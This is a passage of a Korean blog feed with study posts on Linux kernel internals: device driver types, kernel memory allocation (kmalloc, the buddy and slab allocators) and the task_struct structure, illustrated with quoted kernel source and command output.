드라이버(blkdev)</h3><p>disk와 같은 file system을 기반으로 block 단위로 데이터를 read/write한다. 주로 hard disk, CD ROM driver등에 사용된다. 시스템 버퍼 캐시를 사용한다는 특성을 가지고 있다.</p><h3 id="네트워크-디바이스-드라이버-netdev"><a href="#네트워크-디바이스-드라이버-netdev" class="headerlink" title="네트워크 디바이스 드라이버(netdev)"></a>네트워크 디바이스 드라이버(netdev)</h3><p>network의 물리계층과 frame 단위의 데이터를 송수신하는 드라이버이다. 주로 이더넷 디바이스 드라이버(eth0)등에 사용된다.</p><br><p>유저 어플리케이션 입장에서는 가상 파일 시스템(VFS)를 사용하기 때문에 파일 디스크립터를 통해 특정 파일 접근하여 값을 읽거나(read) 쓰는 형태(write)로 쉽게 하드웨어가 제어가능하다. 이런 의미로 파일로 추상화 시켰다고 볼 수 있으며 정형화 된 인터페이스로 불 수 있다는 것 이다. 하지만 세부적으로 보았을 때 버퍼를 사용한다 사용하지 않는다 등의 특징이 있다.</p><br><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><p>커널의 종류를 알아보았으며 해당 커널마다 어떠한 특성을 지니고 발생하는 단점을 해결하기 위해 LKM을 학습하였다. LKM으로 사용되는 예시 중 하나인 디바이스 드라이버에 대해서 조사해보았다. 글이 너무 길어져서 직접 디바이스 드라이버를 개발하는 것은 다음 포스트에서 진행하도록 하겠다.</p><br><h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>As Soon As (ex)Ploit...</code></pre><br><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)https://butter-shower.tistory.com/29https://temp123.tistory.com/16https://tribal1012.tistory.com/154http://artoa.hanbat.ac.kr/lecture_data/embedded_sw/04_old.pdf</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (5) 커널에서의 메모리 할당 3편</title>
    <link href="/2021/09/07/LinuxKernelBasic5/"/>
    <url>/2021/09/07/LinuxKernelBasic5/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-5-커널에서의-메모리-할당-3편"><a href="#Research-Linux-Kernel-Basic-5-커널에서의-메모리-할당-3편" class="headerlink" title="[Research] Linux Kernel Basic - (5) 커널에서의 메모리 할당 3편"></a>[Research] Linux Kernel Basic - (5) 커널에서의 메모리 할당 3편</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 리눅스 커널(Linux Kernel)에서도 연산을 수행하기 위해서 데이터가 저장되어야만 하는 공간이 있어야 한다. 이러한 공간의 주체는 메모리(memory)이며 리눅스 커널(Linux Kernel)에서의 메모리의 할당 방식을 알아본다. 이전 포스트에서는 페이지 단위로 메모리를 할당하는 alloc_page에 대해 언급하였고 해당 포스트에서는 작은 메모리 공간 동적 할당에 대한 포스팅을 진행한다.</p><h2 id="페이지-단위-할당의-문제"><a href="#페이지-단위-할당의-문제" class="headerlink" title="페이지 단위 할당의 문제"></a>페이지 단위 할당의 문제</h2><p><img src="/img/internal_frag.PNG" alt="Internal Fragmentation"></p><p>일반적인 리눅스 시스템의 경우는 물리 메모리를 페이지 단위로 관리한다. 메모리 할당과 메모리 해제에 있어서 페이지의 크기인 4KB(0x1000)을 기준으로 이루어진다는 것이다. 일반적으로 사이즈가 페이지 단위에 근접하는 프로그램이 메모리에 로드되어 프로세스가 되는 경우는 문제가 느껴지지 않을 수 있다. 하지만 커널의 경우에서도 작은 사이즈의 메모리의 동적할당이 필요한 경우가 있을 것이다. 만약 32바이트의 메모리가 필요한 경우에 다음과 같이 페이지 단위로 관리하게 된다면 엄청난 양의 Internal Fragmentation이 발생한다. 더 나아가 빈번한 할당과 해제는 속도에 있어서도 매우 비효율적이다. 이러한 특성들은 메모리의 관리를 페이지 단위로 하기에 발생하는 특성이며 다음 언급할 내용은 이러한 문제를 해결하는 방법이다.</p><h2 id="슬랩-할당자-Slab-Allocator"><a href="#슬랩-할당자-Slab-Allocator" class="headerlink" title="슬랩 할당자(Slab Allocator)"></a>슬랩 할당자(Slab Allocator)</h2><p>슬랩 할당자의 개념을 이해하기 위해서는 커널 개발자가 되었다고 가정해보겠다. 운영체제를 사용하며 프로세스를 시작하거나 하는 등의 일들을 진행할 수 있다. 그 과정에서 다음과 같은 특성을 발견하였다.</p><pre><code>특정한 크기를 가진 메모리가 할당과 해제를 반복한다.</code></pre><p>이러한 특성을 이용하면 보다 효율적인 메모리 할당 시스템을 구현할 수 있다.</p><pre><code>자주 쓰는 메모리 패턴을 정의한 후 미리 할당해 놓는다.해당 패턴에 대한 메모리 할당 요청이 발생할 경우 할당해 놓은 메모리를 사용하게 한다.해당 패턴에 대한 메모리 해제 요청이 발생하면 해제하지 않고 대기한다. 다시 해당 패턴으로 메모리 할당 요청을 할 가능성이 높다.</code></pre><p>해당 구조를 메모리 풀(memory pool) 구조라고 한다. b30w0lf님의 운영체제 시간에 잠깐 여러가지 공을 수영장에 넣어두었다가 준다는 클립 아트를 보았었는데 그것이 바로 이것이다!</p><p>이러한 형태의 메모리 관리 구조를 <u>슬랩 메모리 할당</u>이라고 한다.</p><h2 id="슬랩-캐시-슬랩-오브젝트-슬랩-페이지"><a href="#슬랩-캐시-슬랩-오브젝트-슬랩-페이지" class="headerlink" title="슬랩 캐시, 슬랩 오브젝트, 슬랩 페이지"></a>슬랩 캐시, 슬랩 오브젝트, 슬랩 페이지</h2><h3 id="슬랩-캐시-Slab-Cache"><a href="#슬랩-캐시-Slab-Cache" class="headerlink" title="슬랩 캐시(Slab Cache)"></a>슬랩 캐시(Slab Cache)</h3><p>슬랩 메모리 할당방식을 이야기하며 언급하고 넘어가야 하는 개념이 있다. 슬랩 캐시(Slab Cache), 슬랩 오브젝트(Slab Object), 슬랩 페이지(Slab Page)에 관한 내용이다. </p><p>슬랩 캐시(Slab Cache)란 일종의 슬랩 메모리 할당을 하며 관리하는 주체인 매니저와 같은 형태라고 볼 수 있다. 예를 들어 특정 바이트 만큼의 메모리 할당 요청이 들어올 경우 이를 제공해주고 할당 해제한 슬랩 메모리를 받아서 다시 요청이 들어올 경우 이를 내어주는 주체가 슬랩 캐시라고 보면 된다.</p><pre><code>ray@ubuntu:~/Kernel/device_driver$ sudo cat /proc/slabinfo slabinfo - version: 2.1# name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;mm_struct            180    180   1088   30    8 : tunables    0    0    0 : slabdata      6      6      0task_struct          940    955   6080    5    8 : tunables    0    0    0 : slabdata    191    191      0.kmalloc-512        21464  21632    512   64    8 : tunables    0    0    0 : slabdata    338    338      0kmalloc-256         4843   5248    256   64    4 : tunables    0    0    0 : slabdata     82     82      0kmalloc-192         2058   2058    192   42    2 : tunables    0    0    0 : slabdata     49     49      0kmalloc-128         1472   1472    128   64    2 : tunables    0    0    0 : slabdata     23     23      0kmalloc-96          6029   6300     96   42    1 : tunables    0    0    0 : slabdata    150    150      0kmalloc-64         12318  12800     64   64    1 : tunables    0    0    0 : slabdata    200    200      0kmalloc-32         11050  11136     32  128    1 : tunables    0    0    0 : slabdata     87     87      0kmalloc-16         10240  10240     16  256    1 : tunables    0    0    0 : slabdata     40     40      0kmalloc-8          13312  13312      8  512    1 : tunables    0    0    0 : slabdata     26     26      0</code></pre><p>다음의 명령어를 통해 슬랩 캐시를 확인할 수 있다. 해당 결과를 보면 익숙한 구조체인 task_struct, mm_struct등이 보이며 kmalloc-n과 같은 형태의 n바이트의 메모리에 대한 슬랩 캐시들이 존재하는 것을 확인할 수 있다. 다음과 같은 캐시들이 슬랩 메모리를 관리하는 주체이다. 하나의 슬랩 캐시(Slab Cache)내의 모든 메모리들은 동일한 사이즈로 제공된다는 사실을 알고 있자.</p><h3 id="슬랩-오브젝트-Slab-Object-와-슬랩-페이지-Slab-Page"><a href="#슬랩-오브젝트-Slab-Object-와-슬랩-페이지-Slab-Page" class="headerlink" title="슬랩 오브젝트(Slab Object)와 슬랩 페이지(Slab Page)"></a>슬랩 오브젝트(Slab Object)와 슬랩 페이지(Slab Page)</h3><p><img src="/img/slab_sample.PNG"></p><p>슬랩 오브젝트(Slab Object)란 슬랩 캐시가 미리 확보해 놓은 메모리를 의미하며 이러한 오브젝트들로 구성된 페이지를 슬랩 페이지(Slab Page)라고 한다. 결과적으로 슬랩 페이지 또한 페이지이며 4KB의 크기를 갖는다. 상단의 그림을 확인해보면 특정한 크기로 미리 확보해 놓은 메모리가 슬랩 객체(Slab Object)임을 확인할 수 있으며 해당 메모리가 사용되는 경우는 Alloc으로 마킹되어 있으며 사용하지 않는 경우는 Free로 마킹되어 있는 것을 확인할 수 있다. 이러한 슬립 객체들이 모여서 슬랩 페이지를 구성하고 있음을 볼 수 있다.</p><p>Free된 슬랩 객체의 경우는 freelist라는 리스트 자료구조로 관리되며 이를 통해 해당 메모리에 대해 요청이 들어올 경우 이를 확인하여 슬랩 객체의 주소를 반환할 수 있다.</p><h2 id="커널-코드-분석"><a href="#커널-코드-분석" class="headerlink" title="커널 코드 분석"></a>커널 코드 분석</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">static __always_inline void *kmalloc(size_t size, gfp_t flags)<br>&#123;<br>        if (__builtin_constant_p(size)) &#123;<br>#ifndef CONFIG_SLOB<br>                unsigned int index;<br>#endif<br>                if (size &gt; KMALLOC_MAX_CACHE_SIZE)<br>                        return kmalloc_large(size, flags);<br>#ifndef CONFIG_SLOB<br>                index = kmalloc_index(size);<br><br>                if (!index)<br>                        return ZERO_SIZE_PTR;<br><br>                return kmem_cache_alloc_trace(<br>                                kmalloc_caches[kmalloc_type(flags)][index],<br>                                flags, size);<br>#endif<br>        &#125;<br>        return __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>kmalloc 함수를 확인하면 내부적으로 kmem_cache_alloc_trace를 호출함을 확인할 수 있다.<br><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">void *kmem_cache_alloc_trace(struct kmem_cache *s, gfp_t gfpflags, size_t size)<br>&#123;<br>void *ret = slab_alloc(s, gfpflags, _RET_IP_);<br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags);<br>kasan_kmalloc(s, ret, size, gfpflags);<br>return ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>kmem_cache_alloc_trace 함수는 slab_alloc함수에 kmem_cache와 gfpflags, 주소인 address를 전달함을 확인할 수 있다.<br><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">static __always_inline void *slab_alloc(struct kmem_cache *s,<br>gfp_t gfpflags, unsigned long addr)<br>&#123;<br>return slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>slab_alloc 함수는 slab_alloc_node 함수를 호출함을 알수 있다.<br><br></p><p>slab_alloc_node의 경우는 코드의 중요한 부분만 오디팅하여 작성하겠다. slab_alloc_node 함수는 다음과 같은 로직을 진행한다.</p><pre><code>STEP1. kmem_cache_cpu 구조체로 관리되는 per-cpu 슬럽 캐시를 로딩한다.STEP2. per-cpu 슬랩 캐시의 속성 중 struct page 타입인 page에 접근한다.STEP3. 슬랩 오브젝트를 할당한다.    kmem_cache_cpu 중 freelist에 해제된 슬랩 객체가 있는 경우             해당 슬랩객체를 반환한다.    kmem_cache_cpu 중 freelist에 어떠한 객체도 존재하지 않는 경우              __slab_alloc() 함수를 호출하여 새로운 슬랩 페이지를 할당한다.             할당된 슬랩 페이지에서의 슬랩 객체를 반환한다.</code></pre><h2 id="슬랩-Slab-슬럽-Slob-슬롭-Slub"><a href="#슬랩-Slab-슬럽-Slob-슬롭-Slub" class="headerlink" title="슬랩(Slab), 슬럽(Slob), 슬롭(Slub)"></a>슬랩(Slab), 슬럽(Slob), 슬롭(Slub)</h2><p>슬랩과 슬럽 슬롭은 모두 메모리 할당자이다. 메모리를 미리 만들어 할당하는 형태의 큰 아이디어에서는 변화가 없음으로 동일한 형태로 보아도 무방하다고 조심스럽게 얘기한다. 현재 기준으로는 기본 할당자로 슬럽(Slub)을 사용하고 있다. 슬롭(Slob)의 경우는 지정한 사이즈 내 객체의 메모리 할당은 모두 처리하는 메모리 할당자라고 한다. 메모리를 할당할 경우 속도는 가장 느리나 메타 데이터와 같은 부가 정보가 필요하지 않아 메모리 소모가 적어 임베디드에 적용이 된다고 한다.</p><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>3편에 걸쳐 리눅스 커널에서의 메모리 할당 방식을 알아보았다. 다음 편에서는 실제 디바이스 드라이버를 구현하는 모듈 프로그래밍에 대해서 진행해보도록 하겠다.</p><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)http://egloos.zum.com/rousalome/v/10001242https://jiravvit.tistory.com/entry/linux-kernel-4-슬랩할당자</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (4) 커널에서의 메모리 할당 2편</title>
    <link href="/2021/09/07/LinuxKernelBasic4/"/>
    <url>/2021/09/07/LinuxKernelBasic4/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-4-커널에서의-메모리-할당-2편"><a href="#Research-Linux-Kernel-Basic-4-커널에서의-메모리-할당-2편" class="headerlink" title="[Research] Linux Kernel Basic - (4) 커널에서의 메모리 할당 2편"></a>[Research] Linux Kernel Basic - (4) 커널에서의 메모리 할당 2편</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 리눅스 커널(Linux Kernel)에서도 연산을 수행하기 위해서 데이터가 저장되어야만 하는 공간이 있어야 한다. 이러한 공간의 주체는 메모리(memory)이며 리눅스 커널(Linux Kernel)에서의 메모리의 할당 방식을 알아본다. 포스트 작성에 앞서 오늘의 미팅에서 배웠던 이야기 주제로 자료조사를 진행하며 작성하며 b30W0lf님은 매우 잘 가르쳐주셨지만 무지성 침팬지 나의 두뇌 때문에 잘못된 내용이 있을 수 있음을 밝힌다.</p><h2 id="리눅스-시스템에서의-메모리-할당"><a href="#리눅스-시스템에서의-메모리-할당" class="headerlink" title="리눅스 시스템에서의 메모리 할당"></a>리눅스 시스템에서의 메모리 할당</h2><p>일반적인 리눅스 시스템의 경우는 물리적 메모리를 가지고 있으며 이를 프로세스가 사용할 수 있도록 페이지의 단위로 할당한다. 페이지의 경우는 일반적으로 4KB(0x1000)의 크기를 가지고 있다. 이는 alloc_pages() 함수를 이용해 할당받을 수 있다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">unsigned long __get_free_pages(gfp_t gfp_mask, unsigned int order)<br>&#123;<br>struct page *page;<br><br>page = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);<br>if (!page)<br>return 0;<br>return (unsigned long) page_address(page);<br>&#125;<br></code></pre></td></tr></table></figure><p>해당 코드는 /mm/page_alloc.c에서 확인할 수 있다. 해당 코드 내부에 Line5에는 alloc_pages라는 함수를 확인할 수 있으며 이는 <u>물리 메모리에서의 페이지를 할당 받는 함수</u>이다. 해당 함수의 경우 파라미터로 gfp_mask와 order를 전달하는 것을 확인할 수 있다. 예를 들어 0을 넘기게될 경우 0x1000(4096) 메모리를 할당받고 1을 넘기게 될 경우 0x2000(8192) 메모리를 할당받고 2를 넘기게 될 경우 0x4000(16384)만큼의 메모리를 할당받는다. 이를 살펴보면 2의 제곱의 형태로 페이지를 할당받는 것을 확인할 수 있다. 왜 다음과 같은 형태로 메모리를 할당받을까?</p><p><img src="/img/buddy_meme.PNG" alt="와썹 버디!"></p><p>이는 운영체제 수업에서 언급하였던 Buddy Memory Allocation과 관련이 있다고 판단된다. 원시적(primitive)인 방법을 통해서 메모리를 필요한 공간만큼 지속적으로 할당한 후 이를 더 이상 사용하지 않는다고 판단되어 해제할 경우 해당 프로세스의 메모리 만큼의 빈 공간(Hole)이 발생하며 지속적으로 이러한 형태들이 단편화가 진행된다면 빈 공간은 필요한 메모리 크기 이상으로 존재하나 적재될 수 없는 External Fragmentation의 상황이 발생한다.</p><p><img src="/img/buddy_sample.jpg" alt="Buddy Memory Allocator"></p><p>이러한 문제점을 해결하기 위한 여러가지 방법이 있으나 지정된 크기를 짝을 지어 할당하거나 해제하여 다시 합치는 Buddy Memory Allocator가 있다. 일반적으로 현재의 시스템의 대다수는 Buddy Memory Allocator 형태로 메모리 관리를 진행한다. 이는 상단의 그림을 확인하면 보다 직관적으로 이해할 수 있다. </p><p>다음의 경우는 페이지의 단위(4KB)를 기준으로 메모리를 할당하기에 대용량의 버퍼를 사용하는 경우나 메모리 풀을 관리하는 경우에는 다음과 같은 형태로 메모리를 할당한다.</p><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>다음은 페이지 단위로 메모리를 할당하는 리눅스 시스템을 확인하였고, 서로 짝을 지어 분할하거나 합쳐서 메모리를 해제하는 형태의 Buddy System Allocation을 확인하였다. 그렇다면 대용량의 버퍼가 아닌 커널에서의 구조체의 정보를 담기 위한 작은 사이즈(16Byte, 32Byte, …)등의 메모리를 할당하기 위해서는 어떠한 기법이 적용되어 있는 지 다음 포스트에서 확인해보겠다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (3) 커널에서의 메모리 할당 1편</title>
    <link href="/2021/09/06/LinuxKernelBasic3/"/>
    <url>/2021/09/06/LinuxKernelBasic3/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-3-커널에서의-메모리-할당-1편"><a href="#Research-Linux-Kernel-Basic-3-커널에서의-메모리-할당-1편" class="headerlink" title="[Research] Linux Kernel Basic - (3) 커널에서의 메모리 할당 1편"></a>[Research] Linux Kernel Basic - (3) 커널에서의 메모리 할당 1편</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 리눅스 커널(Linux Kernel)에서도 연산을 수행하기 위해서 데이터가 저장되어야만 하는 공간이 있어야 한다. 이러한 공간의 주체는 메모리(memory)이며 리눅스 커널(Linux Kernel)에서의 메모리의 할당 방식을 알아본다.</p><h2 id="정적-메모리"><a href="#정적-메모리" class="headerlink" title="정적 메모리"></a>정적 메모리</h2><p>커널에서의 정적 메모리 할당에 대하여 구체적으로 알아보려고 한다. 유저 공간의 할당과 마찬가지로 정적 메모리 할당은 특징을 지닌다.</p></br><pre><code>1. 함수 호출 시 함수 프롤로그의 절차를 통해 스택에 공간을 할당한다.2. 유저 공간과는 별개의 커널의 스택 공간이 할당된다.3. 컴파일 시 스택 공간에 얼마만큼의 데이터를 활용할 것인지에 관해 결정된다.4. 함수 호출 시 함수 에필로그의 절차를 통해 정적 메모리는 자동으로 해제된다.</code></pre><p>위의 기재된 내용은 일반적인 유저공간의 스택공간의 할당과 동일해보인다. 부가적인 내용을 붙히자면 컴파일을 통해 스택 프레임의 최상위에서 sub연산을 통해 공간을 확보하고 함수 호출이 종료되는 시점에서 스택 프레임의 최상위에서 add연산을 통해 프레임을 해제한다. 이 후 함수가 호출되어도 스택 포인터(frame pointer)와 베이스 포인터(base pointer)를 기준으로 접근하기에 일반적인 경우라면 문제 발생의 소지가 없다.</p></br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">void rt_mutex_setprio(struct task_struct *p, struct task_struct *pi_task) &#123;<br>    int prio, oldprio, queued, running, queue_flag =<br>        DEQUEUE_SAVE | DEQUEUE_MOVE | DEQUEUE_NOCLOCK;<br>    const struct sched_class *prev_class;<br>    struct rq_flags rf;<br>    struct rq *rq;<br><br>    prio = __rt_effective_prio(pi_task, p-&gt;normal_prio);<br>    ...<br></code></pre></td></tr></table></figure><p>다음의 코드를 확인하면 8개의 변수를 활용하는 것을 알 수 있다.</p></br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">&lt;rt_mutex_setprio&gt;:<br>    e1a0c00d movip, sp<br>    e92ddff0 push&#123;r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc&#125;<br>    e24cb004 subfp, ip, #4<br>    e24dd014 subsp, sp, #20<br>    .<br>    .<br>    .<br></code></pre></td></tr></table></figure><p>해당 함수의 어셈블리 코드를 확인하면 레지스터 {r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}를 스택 공간에 push하며 sub sp, sp, #20을 통해 스택의 20바이트의 공간 만큼을 확보한다. 이 때 사용되는 지역변수의 개수는 8개이며 32바이트 만큼의 공간을 확보해야 한다고 의문이 드나 이는 내부적으로 레지스터를 활용하는 방안으로 진행되지 않았을까라고 조심스럽게 판단한다. 자세한 부분은 b30w0lf님께 여쭤봐야 할 것으로 보인다.</p><h2 id="동적-메모리"><a href="#동적-메모리" class="headerlink" title="동적 메모리"></a>동적 메모리</h2><p>커널에서의 동적 메모리 할당에 대하여 구체적으로 알아보려고 한다. 커널에서의 메모리 할당은 kmalloc() 함수를 이용하여 동적 메모리를 할당한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">static ssize_t regmap_read_debugfs(struct regmap *map, unsigned int from,<br>   unsigned int to, char __user *user_buf, size_t count, loff_t *ppos)<br>    &#123;<br>    ...<br>    if (*ppos &lt; 0 || !count)<br>    return -EINVAL;<br><br>    buf = kmalloc(count, GFP_KERNEL);<br>    if (!buf)<br>    return -ENOMEM;<br></code></pre></td></tr></table></figure><p>상단의 코드를 확인하면 kmalloc() 함수를 볼 수 있으며 해당 함수는 두 개의 인자 count와 GFP_KERNEL이 전달되는 것을 확인할 수 있다. 종합해 코드를 해석하면 GFP_KERNEL 옵션을 통해 count 바이트 만큼 동적 메모리를 할당한다라는 의미이다. kmalloc을 이용하면 커널 내부 메모리 시스템의 경우 커널 내부에 할당할 동적 메모리가 있으면 최대한 할당해준다고 한다.</p><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>정적 메모리의 할당은 유저 공간(user space)에서의 스택 공간할당은 커널 메모리 공간에 할당된다. 이외에는 크게 다른 점이 없어보이며 동적 메모리 할당은 kmalloc() 함수를 사용한다이다. 단 의아한 부분이 커널 내부에 할당할 동적 메모리가 있으면 최대한 할당해준다고 하는 의미인다. 이는 슬랩(slab)에 대한 개념을 익혀야 더욱 깊게 이해가 가능할 것으로 보인다.</p><h2 id="참고자료"><a href="#참고자료" class="headerlink" title="참고자료"></a>참고자료</h2><p><a href="http://rousalome.egloos.com/10002615">http://rousalome.egloos.com/10002615</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (2) 태스크(task)</title>
    <link href="/2021/09/05/LinuxKernelBasic2/"/>
    <url>/2021/09/05/LinuxKernelBasic2/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-2-태스크-task"><a href="#Research-Linux-Kernel-Basic-2-태스크-task" class="headerlink" title="[Research] Linux Kernel Basic - (2) 태스크(task)"></a>[Research] Linux Kernel Basic - (2) 태스크(task)</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>지난 포스트에서는 리눅스 커널 공격(Linux Kernel Exploitation)을 진행하기 위해서는 리눅스 커널(Linux Kernel)에 대해 간략히 언급하였다. 해당 포스트에서는 운영체제(Operating System)에서 다뤄지는 프로세스(prcoess)와 스레드(thread)를 정의하는 구조인 태스크(task)를 커널 소스코드 분석을 통해 심도있게 이해하고 해당 과정을 통해 어떠한 방식으로 권한확대(Local Privilege Escalation)를 일으킬 수 있는 가에 관한 인사이트를 얻기 위한 연구를 진행하였다.</p><h2 id="프로세스-proces-및-스레드-thread"><a href="#프로세스-proces-및-스레드-thread" class="headerlink" title="프로세스(proces) 및 스레드(thread)"></a>프로세스(proces) 및 스레드(thread)</h2><pre><code>$ ps -efUID         PID   PPID  C STIME TTY          TIME CMDroot          1      0  0 01:50 ?        00:00:02 /sbin/init auto nopromptroot          2      0  0 01:50 ?        00:00:00 [kthreadd]root          3      2  0 01:50 ?        00:00:00 [rcu_gp]root          4      2  0 01:50 ?        00:00:00 [rcu_par_gp]root          6      2  0 01:50 ?        00:00:00 [kworker/0:0H-kb]root          9      2  0 01:50 ?        00:00:00 [mm_percpu_wq]root         10      2  0 01:50 ?        00:00:00 [ksoftirqd/0]root         11      2  0 01:50 ?        00:00:00 [rcu_sched]root         12      2  0 01:50 ?        00:00:00 [migration/0]root         13      2  0 01:50 ?        00:00:00 [idle_inject/0]</code></pre><p>리눅스를 사용하다보면 다음과 같은 명령어를 통해 프로세스의 정보를 확인해야하는 경우가 발생한다. 프로세스의 정보를 확인하면 어떠한 프로세스인지, 프로세스의 번호는 몇번인지, 어떠한 권한으로 동작을 진행하는지에 관한 정보들을 확인할 수 있다. 리눅스에서는 프로세스에 종속되어 새로운 실행의 흐름을 생성하는 스레드(thread)의 경우에도 하나의 프로그램의 실행단위로 볼 수 있으며 이러한 단위를 태스크(task)라고 한다.</p><h2 id="태스크-task"><a href="#태스크-task" class="headerlink" title="태스크(task)"></a>태스크(task)</h2><p>리눅스 운영체제의 경우 컴퓨터가 해야할 작업의 단위인 여러 개의 태스크(task)를 생성하며 다수의 태스크를 관리(multitasking)하며 이러한 태스크의 실행 시간을 배분하는 방식(scheduling)을 통해 사용자가 다수의 프로그램을 정상적으로 사용할 수 있도록 한다. 태스크를 관리하기 위해서는 여러가지 정보가 필요하다. 이는 앞서 제시하였던 명령어의 결과로 일부를 확인할 수 있다. 이러한 정보는 task_struct 구조체에 정의되어 있으며 해당 구조체는 &lt;include/linux/sched.h&gt;에서 확인할 수 있다.</p><h3 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">struct task_struct &#123;<br>    ...<br>unsigned int__state;<br>struct list_headtasks;<br>    struct mm_struct*mm;<br>pid_tpid;<br>pid_ttgid;<br>struct task_struct __rcu*real_parent;<br>struct task_struct __rcu*parent;<br>const struct cred __rcu*cred;<br>charcomm[TASK_COMM_LEN];<br>struct files_struct*files;<br>    